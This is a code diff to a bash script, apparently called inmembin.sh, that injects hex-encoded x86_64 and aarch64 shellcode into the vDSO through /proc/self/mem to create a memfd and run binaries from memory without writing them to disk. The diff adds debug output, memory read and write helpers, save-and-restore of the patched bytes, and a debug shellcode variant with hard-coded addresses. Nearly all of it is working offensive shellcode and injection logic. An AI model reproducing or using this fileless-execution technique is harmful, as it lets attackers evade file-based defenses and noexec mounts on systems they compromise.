@@ -7,6 +7,7 @@ Ex: bash ./inmembin.sh & sleep 0.3; cp $(command which echo) /proc/$!/fd/4; /pro
 
 # Global architecture
 ARCH=$(uname -m)  # x86_64 or aarch64
+: "{DEBUG:=1}"
 
 # Clause: leave if CPU not supported
 case $ARCH in x86_64|aarch64):;; *)
@@ -24,16 +25,45 @@ create_memfd(){
   jumper_hex="$(craft_jumper "$shellcode_addr")"
   jumper_addr="$(get_read_syscall_ret_addr)"
   
+  [ "$DEBUG" != 0 ] && >&2 printf "%s" "InMemBin: shellcode_addr=$shellcode_addr,jumper_addr=$jumper_addr"
+
+  # Backup
+  [ "$DEBUG" != 0 ] && >&2 echo Read1
+  shellcode_save_hex=$(read_mem "$shellcode_addr" $(( ${#shellcode_hex} / 2 )))
+  [ "$DEBUG" != 0 ] && >&2 echo Read2
+  jumper_save_hex=$(read_mem "$jumper_addr" $(( ${#jumper_hex} / 2 )))
+
   # Overwrite vDSO with our shellcode
-  exec 3> /proc/self/mem
-  seek "$shellcode_addr" <&3
-  unhexify "$shellcode_hex" >&3
-  exec 3>&-
+  [ "$DEBUG" != 0 ] && >&2 echo Write1
+  write_mem "$shellcode_addr" "$shellcode_hex"
 
   # Write jump instruction where it will be found shortly
+  [ "$DEBUG" != 0 ] && >&2 echo Write2
+  write_mem "$jumper_addr" "$jumper_hex"
+
+  [ "$DEBUG" != 0 ] && >&2 echo Write3
+  write_mem "$shellcode_addr" "$shellcode_save_hex"
+  write_mem "$jumper_addr" "$jumper_save_hex"
+
+  [ "$DEBUG" != 0 ] && >&2 echo "InMemBin: Function is back"
+}
+
+
+read_mem(){
+  : 'Read mem at pos (arg1) with size (arg2)
+    TODO: Implementing... bash only
+  '
+  exec 3< /proc/self/mem
+  xxd -s "$1" -l "$2"  -c 1000000 -p <&3
+  exec 3<&-
+}
+
+
+write_mem(){
   exec 3> /proc/self/mem
-  seek "$jumper_addr" <&3
-  unhexify "$jumper_hex" >&3
+  seek "$1" <&3
+  unhexify "$2" >&3
+  exec 3>&-
 }
 
 
@@ -43,7 +73,15 @@ craft_shellcode(){
   case $ARCH in
     x86_64)
       out=4831c04889c6b0024889c7b0210f05  # dup
-      out="${out}68444541444889e74831f64889f0b401b03f0f054889c7b04d0f05b0220f05";;  # memfd
+      ## ORIGIN
+      #out="${out}68444541444889e74831f64889f0b401b03f0f054889c7b04d0f05b0220f05";;  # memfd
+
+      ## Debug with jump
+      out="${out}68444541444889e74831f64889f0b401b03f0f054889c7b04d"
+      out="${out}5831c0"  # pop eax, xor eax, eax
+      # memprotect + mov + jump back
+      out="${out}b80a00000048bf0040d1f7ff7f0000ba07000000be0c0000000f0549bf9249d1f7ff7f000041c707483d00f041c74704ffff775641c74708c30f1f4441ffe7"
+      ;;
     aarch64)
       out=080380d2400080d2010080d2010000d4
       out="${out}802888d2a088a8f2e00f1ff8e0030091210001cae82280d2010000d4c80580d2010000d4881580d2010000d4610280d2281080d2010000d4";;
@@ -124,3 +162,4 @@ case ${0##*/} in
   bash|zsh|dash|ash|ksh|mksh|sh) :;;
   *) create_memfd;;
 esac
+[ "$DEBUG" != 0 ] && >&2 echo "InMemBin: Over"
